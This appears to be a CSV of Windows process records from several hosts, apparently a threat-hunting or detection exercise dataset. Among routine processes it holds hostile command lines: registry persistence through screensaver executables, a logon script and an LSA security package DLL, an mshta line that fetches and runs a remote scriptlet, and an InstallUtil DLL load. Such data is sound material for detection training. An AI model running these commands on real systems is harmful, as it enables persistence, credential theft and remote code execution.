arguments,hostname,name,path,pid,username
"""C:\Program Files (x86)\OpenOffice 4\program\soffice.exe"" ",SB0001FSX,soffice.exe,C:\Program Files (x86)\OpenOffice 4\program,2904,annab.marti
\??\C:\Windows\system32\conhost.exe,SB0001FSX,conhost.exe,C:\Windows\system32,6356,NT AUTHORITY\SYSTEM
%SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024 20480 768 Windows=On SubSystemType=Windows ServerDll=basesrv 1 ServerDll=winsrv:UserServerDllInitialization 3 ServerDll=winsrv:ConServerDllInitialization 2 ServerDll=sxssrv 4 ProfileControl=Off MaxRequestThreads=16,SB0001FSX,csrss.exe,C:\Windows\system32,6404,NT AUTHORITY\SYSTEM
\SystemRoot\System32\smss.exe,SB0001FSX,smss.exe,\SystemRoot\System32,3740,NT AUTHORITY\SYSTEM
C:\Windows\servicing\TrustedInstaller.exe,SB0001FSX,TrustedInstaller.exe,C:\Windows\servicing,2140,NT AUTHORITY\SYSTEM
"""C:\Program Files\Windows Media Player\wmpnetwk.exe""",SB0001FSX,wmpnetwk.exe,C:\Program Files\Windows Media Player,4284,NT AUTHORITY\SYSTEM
"C:\Windows\System32\reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v SCRNSAVE.EXE /t REG_SZ /d ""%SystemRoot%\System32\cats.scr"" /f",SB0001FSX,reg.exe,C:\Windows\System32\reg.exe,1036,support_38110
C:\Windows\system32\lsm.exe,SB0001FSX,lsm.exe,C:\Windows\system32,6252,NT AUTHORITY\SYSTEM
"""C:\Program Files (x86)\TeamViewer\tv_w32.exe"" --action hooks  --log C:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log  ",SB0001FSX,tv_w32.exe,C:\Program Files (x86)\TeamViewer,1675,pheo.cam
"C:\Windows\System32\reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaverTimeout /t REG_SZ /d 60 /f",SB0001FSX,reg.exe,C:\Windows\System32\reg.exe,112,loghernand
"C:\Windows\System32\reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v SCRNSAVE.EXE /t REG_SZ /d ""%SystemRoot%\System32\08wy8y.scr"" /f",SB0001FSX,reg.exe,C:\Windows\System32\reg.exe,4344,jose.colema
"""C:\Program Files\AVAST Software\Avast\AvastUI.exe"" /welcome",SB0001FSX,AvastUI.exe,C:\Program Files\AVAST Software\Avast,2777,jose.colema
"""C:\Users\annab.marti\AppData\Local\Microsoft\OneDrive\OneDrive.exe"" ",SB0001FSX,OneDrive.exe,C:\Users\annab.marti\AppData\Local\Microsoft\OneDrive,4642,annab.marti
C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork,SB0001FSX,svchost.exe,C:\Windows\system32,1928,NT AUTHORITY\SYSTEM
"C:\Windows\System32\reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveActive /t REG_SZ /d 1 /f",SB0001FSX,reg.exe,C:\Windows\System32\reg.exe,964,loghernand
C:\Windows\system32\svchost.exe -k NetworkService,SB0001FSX,svchost.exe,C:\Windows\system32,3572,NT AUTHORITY\SYSTEM
"C:\Windows\System32\reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaveActive /t REG_SZ /d 1 /f",SB0001FSX,reg.exe,C:\Windows\System32\reg.exe,5848,annab.marti
C:\Windows\system32\SearchIndexer.exe /Embedding,SB0001FSX,SearchIndexer.exe,C:\Windows\system32,4672,NT AUTHORITY\SYSTEM
"""C:\Windows\system32\wuauclt.exe""",SB0001FSX,wuauclt.exe,C:\Windows\system32,6380,NT AUTHORITY\SYSTEM
"""taskhost.exe""",SB0001FSX,taskhost.exe,C:\Windows\system32,956,NT AUTHORITY\SYSTEM
C:\Windows\System32\VBoxService.exe,SB0001FSX,VBoxService.exe,C:\Windows\System32,1416,NT AUTHORITY\SYSTEM
C:\Windows\System32\svchost.exe -k secsvcs,SB0001FSX,svchost.exe,C:\Windows\System32,2420,NT AUTHORITY\SYSTEM
C:\Windows\System32\spoolsv.exe,SB0001FSX,spoolsv.exe,C:\Windows\System32,4868,NT AUTHORITY\SYSTEM
C:\Windows\System32\cmd.exe /C net time \\SB0001FSX,SB0001FSX,cmd.exe,C:\Windows\System32\cmd.exe,6464,pheo.cam
"C:\WINDOWS\system32\cmd.exe /c """"C:\Ruby24-x64\bin\irb.cmd"" """,SB0001FSX,cmd.exe,C:\WINDOWS\system32,2781,annab.marti
"C:\Windows\System32\reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f",SB0001FSX,reg.exe,C:\Windows\System32\reg.exe,6172,jose.colema
C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted,SB0001FSX,svchost.exe,C:\Windows\System32,2664,NT AUTHORITY\SYSTEM
"""C:\Program Files (x86)\TeamViewer\TeamViewer.exe"" ",SB0001FSX,TeamViewer.exe,C:\Program Files (x86)\TeamViewer,3723,pheo.cam
C:\Windows\system32\svchost.exe -k LocalService,SB0001FSX,svchost.exe,C:\Windows\system32,408,NT AUTHORITY\SYSTEM
C:\Windows\System32\reg.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_MULTI_SZ /d C:\Windows\dnlk1.ps1,SB0001FSX,reg.exe,C:\Windows\System32\reg.exe,4828,jose.colema
C:\Windows\system32\svchost.exe -k RPCSS,SB0001FSX,svchost.exe,C:\Windows\system32,1840,NT AUTHORITY\SYSTEM
C:\Windows\System32\svchost.exe -k LocalServicePeerNet,SB0001FSX,svchost.exe,C:\Windows\System32,5288,NT AUTHORITY\SYSTEM
"C:\Windows\System32\reg.exe add ""HKEY_CURRENT_USER\Control Panel\Desktop"" /v ScreenSaverTimeout /t REG_SZ /d 60 /f",SB0001FSX,reg.exe,C:\Windows\System32\reg.exe,1212,loghernand
c:\windows\system32\svchost.exe -k netsvcs -p -s Appinfo,SB0004VPD,svchost.exe,c:\windows\system32,732,NT AUTHORITY\SYSTEM
c:\windows\system32\svchost.exe -k localserviceandnoimpersonation -p -s SSDPSRV,SB0004VPD,svchost.exe,c:\windows\system32,1020,NT AUTHORITY\SYSTEM
c:\windows\system32\svchost.exe -k netsvcs -p -s SENS,SB0004VPD,svchost.exe,c:\windows\system32,1652,NT AUTHORITY\SYSTEM
c:\windows\system32\svchost.exe -k localservicenetworkrestricted -p -s EventLog,SB0004VPD,svchost.exe,c:\windows\system32,3140,NT AUTHORITY\SYSTEM
c:\windows\system32\svchost.exe -k localservice -p -s bthserv,SB0004VPD,svchost.exe,c:\windows\system32,3808,NT AUTHORITY\SYSTEM
"""C:\Program Files (x86)\TeamViewer\TeamViewer_Service.exe""",SB0004VPD,TeamViewer_Service.exe,C:\Program Files (x86)\TeamViewer,3734,lol.griffi
C:\Windows\system32\BtwRSupportService.exe,SB0004VPD,BtwRSupportService.exe,C:\Windows\system32,6164,NT AUTHORITY\SYSTEM
"""C:\Users\a.gjenkins\AppData\Local\Microsoft\OneDrive\OneDrive.exe"" ",SB0004VPD,OneDrive.exe,C:\Users\a.gjenkins\AppData\Local\Microsoft\OneDrive,3399,a.gjenkins
c:\windows\system32\svchost.exe -k networkservice -p -s NlaSvc,SB0004VPD,svchost.exe,c:\windows\system32,2384,NT AUTHORITY\SYSTEM
c:\windows\system32\svchost.exe -k networkservice -p -s TapiSrv,SB0004VPD,svchost.exe,c:\windows\system32,324,NT AUTHORITY\SYSTEM
"""C:\Program Files (x86)\TeamViewer\tv_w32.exe"" --action hooks  --log C:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log  ",SB0004VPD,tv_w32.exe,C:\Program Files (x86)\TeamViewer,5675,a.gjenkins
c:\windows\system32\svchost.exe -k netsvcs -p -s LanmanServer,SB0004VPD,svchost.exe,c:\windows\system32,2520,NT AUTHORITY\SYSTEM
sihost.exe,SB0004VPD,sihost.exe,c:\windows\system32,4868,NT AUTHORITY\SYSTEM
c:\windows\system32\svchost.exe -k localservicenetworkrestricted -p -s wscsvc,SB0004VPD,svchost.exe,c:\windows\system32,1748,NT AUTHORITY\SYSTEM
c:\windows\system32\svchost.exe -k localsystemnetworkrestricted -p -s NcbService,SB0004VPD,svchost.exe,c:\windows\system32,960,NT AUTHORITY\SYSTEM
"""C:\Windows\SystemApps\Microsoft.LockApp_cw5n1h2txyewy\LockApp.exe"" -ServerName:WindowsDefaultLockScreen.AppX7y4nbzq37zn4ks9k7amqjywdat7d3j2z.mca",SB0004VPD,LockApp.exe,C:\Windows\SystemApps\Microsoft.LockApp_cw5n1h2txyewy,2460,NT AUTHORITY\SYSTEM
c:\windows\system32\svchost.exe -k localservice -p -s BthAvctpSvc,SB0004VPD,svchost.exe,c:\windows\system32,496,NT AUTHORITY\SYSTEM
c:\windows\system32\svchost.exe -k netsvcs -p -s BITS,SB0004VPD,svchost.exe,c:\windows\system32,5000,NT AUTHORITY\SYSTEM
,SB0004VPD,wininit.exe,,2704,NT AUTHORITY\SYSTEM
c:\windows\system32\svchost.exe -k appmodel -p -s StateRepository,SB0004VPD,svchost.exe,c:\windows\system32,5044,NT AUTHORITY\SYSTEM
c:\windows\system32\svchost.exe -k localservicenetworkrestricted -p -s TimeBrokerSvc,SB0004VPD,svchost.exe,c:\windows\system32,5572,NT AUTHORITY\SYSTEM
C:\Windows\system32\SearchIndexer.exe /Embedding,SB0004VPD,SearchIndexer.exe,C:\Windows\system32,3372,NT AUTHORITY\SYSTEM
C:\Windows\System32\RuntimeBroker.exe -Embedding,SB0004VPD,RuntimeBroker.exe,C:\Windows\System32,2020,NT AUTHORITY\SYSTEM
c:\windows\system32\svchost.exe -k localsystemnetworkrestricted -p -s SysMain,SB0004VPD,svchost.exe,c:\windows\system32,2696,NT AUTHORITY\SYSTEM
c:\windows\system32\svchost.exe -k localservice -p -s SstpSvc,SB0004VPD,svchost.exe,c:\windows\system32,4300,NT AUTHORITY\SYSTEM
c:\windows\system32\svchost.exe -k netsvcs -p -s Schedule,SB0004VPD,svchost.exe,c:\windows\system32,3940,NT AUTHORITY\SYSTEM
C:\Windows\system32\svchost.exe -k imgsvc,SB0004VPD,svchost.exe,C:\Windows\system32,2380,NT AUTHORITY\SYSTEM
C:\Windows\Explorer.EXE,SB0004VPD,Explorer.EXE,C:\Windows,4208,NT AUTHORITY\SYSTEM
c:\windows\system32\svchost.exe -k localsystemnetworkrestricted -p -s SensorService,SB0004VPD,svchost.exe,c:\windows\system32,6076,NT AUTHORITY\SYSTEM
"""C:\Program Files\Git\usr\bin\bash.exe""",SB0004VPD,bash.exe,C:\Program Files\Git\usr\bin,4380,isai.bel
c:\windows\system32\svchost.exe -k netsvcs -p -s Winmgmt,SB0004VPD,svchost.exe,c:\windows\system32,3604,NT AUTHORITY\SYSTEM
,SB0004VPD,csrss.exe,,3044,NT AUTHORITY\SYSTEM
c:\windows\system32\svchost.exe -k networkservice -p -s LanmanWorkstation,SB0004VPD,svchost.exe,c:\windows\system32,3888,NT AUTHORITY\SYSTEM
c:\windows\system32\svchost.exe -k dcomlaunch -p -s PlugPlay,SB0004VPD,svchost.exe,c:\windows\system32,1936,NT AUTHORITY\SYSTEM
,SB0004VPD,Memory Compression,,4936,NT AUTHORITY\SYSTEM
C:\Windows\System32\WinLogon.exe -SpecialSession,SB0004VPD,WinLogon.exe,C:\Windows\System32,6312,NT AUTHORITY\SYSTEM
"""C:\Program Files\internet explorer\iexplore.exe"" ",SB0004VPD,iexplore.exe,C:\Program Files\internet explorer,2887,ann.mar3
"""C:\Windows\system32\notepad.exe"" ",SB0004VPD,notepad.exe,C:\Windows\system32,5521,lol.griffi
c:\windows\system32\svchost.exe -k netsvcs -p -s iphlpsvc,SB0004VPD,svchost.exe,c:\windows\system32,1196,NT AUTHORITY\SYSTEM
c:\windows\system32\svchost.exe -k unistacksvcgroup -s CDPUserSvc,SB0004VPD,svchost.exe,c:\windows\system32,200,NT AUTHORITY\SYSTEM
c:\windows\system32\svchost.exe -k localservice -p -s CDPSvc,SB0004VPD,svchost.exe,c:\windows\system32,1348,NT AUTHORITY\SYSTEM
"""C:\Program Files\KeePassXC\KeePassXC.exe"" ",SB0004VPD,KeePassXC.exe,C:\Program Files\KeePassXC,5112,a.dgonzales
c:\windows\system32\svchost.exe -k unistacksvcgroup,SB0004VPD,svchost.exe,c:\windows\system32,2348,NT AUTHORITY\SYSTEM
c:\windows\system32\svchost.exe -k localservicenetworkrestricted -p -s WinHttpAutoProxySvc,SB0004VPD,svchost.exe,c:\windows\system32,1240,NT AUTHORITY\SYSTEM
c:\windows\system32\svchost.exe -k netsvcs -p -s Themes,SB0004VPD,svchost.exe,c:\windows\system32,5276,NT AUTHORITY\SYSTEM
C:\Windows\system32\svchost.exe -k LocalService -p,SB0004VPD,svchost.exe,C:\Windows\system32,100,NT AUTHORITY\SYSTEM
,SB0004VPD,smss.exe,,2452,NT AUTHORITY\SYSTEM
"""fontdrvhost.exe""",SB0004VPD,fontdrvhost.exe,C:\Windows\System32,272,NT AUTHORITY\SYSTEM
C:\Windows\system32\svchost.exe -k DcomLaunch -p,SB0004VPD,svchost.exe,C:\Windows\system32,5680,NT AUTHORITY\SYSTEM
"""C:\Program Files (x86)\TeamViewer\TeamViewer.exe"" ",SB0004VPD,TeamViewer.exe,C:\Program Files (x86)\TeamViewer,921,lol.griffi
,SB0004VPD,MsMpEng.exe,,6204,NT AUTHORITY\SYSTEM
c:\windows\system32\svchost.exe -k netsvcs -p -s UserManager,SB0004VPD,svchost.exe,c:\windows\system32,1328,NT AUTHORITY\SYSTEM
C:\Windows\system32\DllHost.exe /Processid:{973D20D7-562D-44B9-B70B-5A0F49CCDF3F},SB0004VPD,DllHost.exe,C:\Windows\system32,6388,NT AUTHORITY\SYSTEM
"""C:\Program Files\AVAST Software\Avast\AvastUI.exe"" /welcome",SB0004VPD,AvastUI.exe,C:\Program Files\AVAST Software\Avast,6498,isai.bel
,SB0004VPD,SgrmBroker.exe,,1060,NT AUTHORITY\SYSTEM
c:\windows\system32\svchost.exe -k localsystemnetworkrestricted -p -s StorSvc,SB0004VPD,svchost.exe,c:\windows\system32,384,NT AUTHORITY\SYSTEM
c:\windows\system32\svchost.exe -k localservice -p -s WdiServiceHost,SB0004VPD,svchost.exe,c:\windows\system32,2560,NT AUTHORITY\SYSTEM
c:\windows\system32\svchost.exe -k netsvcs -p -s ShellHWDetection,SB0004VPD,svchost.exe,c:\windows\system32,2932,NT AUTHORITY\SYSTEM
c:\windows\system32\svchost.exe -k networkservice -p -s Dnscache,SB0004VPD,svchost.exe,c:\windows\system32,1156,NT AUTHORITY\SYSTEM
"""C:\Program Files (x86)\TeamViewer\TeamViewer_Service.exe""",SB0004VPD,TeamViewer_Service.exe,C:\Program Files (x86)\TeamViewer,2088,a.gjenkins
c:\windows\system32\svchost.exe -k localsystemnetworkrestricted -p -s DsSvc,SB0004VPD,svchost.exe,c:\windows\system32,3932,NT AUTHORITY\SYSTEM
c:\windows\system32\svchost.exe -k rpcss -p,SB0004VPD,svchost.exe,c:\windows\system32,4968,NT AUTHORITY\SYSTEM
"""C:\Windows\system32\SearchFilterHost.exe"" 0 736 740 748 8192 744 ",SB0004VPD,SearchFilterHost.exe,C:\Windows\system32,1304,NT AUTHORITY\SYSTEM
,SB0004VPD,AvastSvc.exe,,2960,isai.bel
C:\Windows\system32\lsass.exe,SB0004VPD,lsass.exe,C:\Windows\system32,6464,NT AUTHORITY\SYSTEM
c:\windows\system32\svchost.exe -k netsvcs -p -s lfsvc,SB0004VPD,svchost.exe,c:\windows\system32,5180,NT AUTHORITY\SYSTEM
C:\Windows\System32\reg.exe ADD HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v Security Packages /t REG_expand_SZ /d C:\Windows\System32\b2dp644.dll,SB0004VPD,reg.exe,C:\Windows\System32\reg.exe,5684,isai.bel
c:\windows\system32\svchost.exe -k netsvcs -p,SB0004VPD,svchost.exe,c:\windows\system32,1428,NT AUTHORITY\SYSTEM
"""C:\Users\a.dgonzales\AppData\Local\Programs\Python\Python37\python.exe"" ",SB0004VPD,python.exe,C:\Users\a.dgonzales\AppData\Local\Programs\Python\Python37,4370,a.dgonzales
c:\windows\system32\svchost.exe -k dcomlaunch -p -s LSM,SB0004VPD,svchost.exe,c:\windows\system32,552,NT AUTHORITY\SYSTEM
"""fontdrvhost.exe""",SB0004VPD,fontdrvhost.exe,C:\Windows\system32,436,NT AUTHORITY\SYSTEM
c:\windows\system32\svchost.exe -k localsystemnetworkrestricted -p -s TabletInputService,SB0004VPD,svchost.exe,c:\windows\system32,6116,NT AUTHORITY\SYSTEM
"usr\bin\mintty.exe --nodaemon -o AppID=GitForWindows.Bash -o AppLaunchCmd=""C:\Program Files\Git\git-bash.exe"" -o AppName=""Git Bash"" -i ""C:\Program Files\Git\git-bash.exe"" --store-taskbar-properties -- /usr/bin/bash --login -i",SB0004VPD,mintty.exe,C:\Program Files\Git\usr\bin,2591,isai.bel
c:\windows\system32\svchost.exe -k localsystemnetworkrestricted -p -s TrkWks,SB0004VPD,svchost.exe,c:\windows\system32,3764,NT AUTHORITY\SYSTEM
\??\C:\Windows\system32\conhost.exe 0x4,SB0004VPD,conhost.exe,C:\Windows\system32,4624,NT AUTHORITY\SYSTEM
C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p,SB0004VPD,svchost.exe,C:\Windows\System32,6196,NT AUTHORITY\SYSTEM
C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p,SB0004VPD,svchost.exe,C:\Windows\system32,1776,NT AUTHORITY\SYSTEM
c:\windows\system32\svchost.exe -k localservice -p -s FontCache,SB0004VPD,svchost.exe,c:\windows\system32,4020,NT AUTHORITY\SYSTEM
C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork -p,SB0004VPD,svchost.exe,C:\Windows\system32,1384,NT AUTHORITY\SYSTEM
,SB0004VPD,NisSrv.exe,,5068,NT AUTHORITY\SYSTEM
c:\windows\system32\svchost.exe -k netsvcs -p -s WpnService,SB0004VPD,svchost.exe,c:\windows\system32,3028,NT AUTHORITY\SYSTEM
c:\windows\system32\svchost.exe -k localservicenonetwork -p -s DPS,SB0004VPD,svchost.exe,c:\windows\system32,3696,NT AUTHORITY\SYSTEM
c:\windows\system32\svchost.exe -k localservice -p -s LicenseManager,SB0004VPD,svchost.exe,c:\windows\system32,920,NT AUTHORITY\SYSTEM
"""C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe"" -ServerName:CortanaUI.AppXa50dqqa5gqv4a428c9y1jjw7m3btvepj.mca",SB0004VPD,SearchUI.exe,C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy,1536,NT AUTHORITY\SYSTEM
C:\Windows\system32\svchost.exe -k SDRSVC,SB0004VPD,svchost.exe,C:\Windows\system32,4700,NT AUTHORITY\SYSTEM
c:\windows\system32\svchost.exe -k localservicenetworkrestricted -p -s Dhcp,SB0004VPD,svchost.exe,c:\windows\system32,4528,NT AUTHORITY\SYSTEM
c:\windows\system32\svchost.exe -k netsvcs -p -s ProfSvc,SB0004VPD,svchost.exe,c:\windows\system32,3204,NT AUTHORITY\SYSTEM
C:\Windows\System32\svchost.exe -k utcsvc -p,SB0004VPD,svchost.exe,C:\Windows\System32,6168,NT AUTHORITY\SYSTEM
,SB0004VPD,System,,5856,NT AUTHORITY\SYSTEM
c:\windows\system32\svchost.exe -k unistacksvcgroup -s WpnUserService,SB0004VPD,svchost.exe,c:\windows\system32,1264,NT AUTHORITY\SYSTEM
"""C:\Program Files (x86)\TeamViewer\tv_w32.exe"" --action hooks  --log C:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log  ",SB0004VPD,tv_w32.exe,C:\Program Files (x86)\TeamViewer,1193,lol.griffi
,SB0004VPD,Registry,,3132,NT AUTHORITY\SYSTEM
C:\Windows\system32\ApplicationFrameHost.exe -Embedding,SB0004VPD,ApplicationFrameHost.exe,C:\Windows\system32,356,NT AUTHORITY\SYSTEM
c:\windows\system32\svchost.exe -k localsystemnetworkrestricted -p -s AudioEndpointBuilder,SB0004VPD,svchost.exe,c:\windows\system32,4152,NT AUTHORITY\SYSTEM
c:\windows\system32\svchost.exe -k netsvcs -p -s TokenBroker,SB0004VPD,svchost.exe,c:\windows\system32,4276,NT AUTHORITY\SYSTEM
"C:\Windows\System32\mshta vbscript:Close(Execute(""GetObject(""""script:http://www.Ш3.com.au/lsacc.sct"""")""))",SB0004VPD,mshta.exe,C:\Windows\System32\mshta.exe,4288,lol.griffi
c:\windows\system32\svchost.exe -k netsvcs,SB0004VPD,svchost.exe,c:\windows\system32,5300,NT AUTHORITY\SYSTEM
"""dwm.exe""",SB0004VPD,dwm.exe,C:\Windows\System32,3412,NT AUTHORITY\SYSTEM
C:\Windows\system32\SettingSyncHost.exe -Embedding,SB0004VPD,SettingSyncHost.exe,C:\Windows\system32,2188,NT AUTHORITY\SYSTEM
c:\windows\system32\svchost.exe -k networkservice -p -s CryptSvc,SB0004VPD,svchost.exe,c:\windows\system32,2212,NT AUTHORITY\SYSTEM
,SB0004VPD,svchost.exe,,2988,NT AUTHORITY\SYSTEM
"""C:\Program Files (x86)\Common Files\Java\Java Update\jusched.exe"" ",SB0004VPD,jusched.exe,C:\Program Files (x86)\Common Files\Java\Java Update,1040,NT AUTHORITY\SYSTEM
c:\windows\system32\svchost.exe -k localservice -p -s EventSystem,SB0004VPD,svchost.exe,c:\windows\system32,2956,NT AUTHORITY\SYSTEM
C:\Windows\System32\spoolsv.exe,SB0004VPD,spoolsv.exe,C:\Windows\System32,5008,NT AUTHORITY\SYSTEM
"""C:\Program Files (x86)\TeamViewer\TeamViewer.exe"" ",SB0004VPD,TeamViewer.exe,C:\Program Files (x86)\TeamViewer,5619,a.gjenkins
"""ctfmon.exe""",SB0004VPD,ctfmon.exe,C:\Windows\system32,348,NT AUTHORITY\SYSTEM
c:\windows\system32\svchost.exe -k localservice -p -s nsi,SB0004VPD,svchost.exe,c:\windows\system32,972,NT AUTHORITY\SYSTEM
C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p -s lmhosts,SB0004VPD,svchost.exe,C:\Windows\System32,328,NT AUTHORITY\SYSTEM
c:\windows\system32\svchost.exe -k localservice -p -s WebClient,SB0004VPD,svchost.exe,c:\windows\system32,6344,NT AUTHORITY\SYSTEM
"""C:\Program Files\Git\git-bash.exe"" ""--cd=C:\Users\isai.bel\Desktop.""",SB0004VPD,git-bash.exe,C:\Program Files\Git,3137,isai.bel
c:\windows\system32\svchost.exe -k localsystemnetworkrestricted -p -s DeviceAssociationService,SB0004VPD,svchost.exe,c:\windows\system32,3056,NT AUTHORITY\SYSTEM
C:\Windows\System32\svchost.exe -k NetworkService -p -s DoSvc,SB0004VPD,svchost.exe,C:\Windows\System32,4596,NT AUTHORITY\SYSTEM
c:\windows\system32\svchost.exe -k localservice -p -s netprofm,SB0004VPD,svchost.exe,c:\windows\system32,1632,NT AUTHORITY\SYSTEM
c:\windows\system32\svchost.exe -k localservicenetworkrestricted -s BTAGService,SB0004VPD,svchost.exe,c:\windows\system32,4632,NT AUTHORITY\SYSTEM
,SB0004VPD,services.exe,,3052,NT AUTHORITY\SYSTEM
C:\Windows\system32\svchost.exe -k netsvcs -p -s wlidsvc,SB0004VPD,svchost.exe,C:\Windows\system32,3112,NT AUTHORITY\SYSTEM
/logfile= /LogToConsole=false /U C:\Windows\System\8gzbjqoxsc.dll,SB0004VPD,InstallUtil,C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe,1880,NT AUTHORITY\SYSTEM
taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E},SB0004VPD,taskhostw.exe,c:\windows\system32,460,NT AUTHORITY\SYSTEM
"""C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe"" -ServerName:App.AppXtk181tbxbce2qsex02s8tw7hfxa9xb3t.mca",SB0004VPD,ShellExperienceHost.exe,C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy,5192,NT AUTHORITY\SYSTEM
c:\windows\system32\svchost.exe -k localsystemnetworkrestricted -p -s PcaSvc,SB0004VPD,svchost.exe,c:\windows\system32,1048,NT AUTHORITY\SYSTEM
,SB0004VPD,SecurityHealthService.exe,,1904,NT AUTHORITY\SYSTEM
C:\Windows\system32\lsass.exe,SE0003VPD,lsass.exe,C:\Windows\system32,1696,NT AUTHORITY\SYSTEM
C:\Windows\Explorer.EXE,SE0003VPD,Explorer.EXE,C:\Windows,6448,NT AUTHORITY\SYSTEM
C:\Windows\system32\svchost.exe -k NetworkService,SE0003VPD,svchost.exe,C:\Windows\system32,6300,NT AUTHORITY\SYSTEM
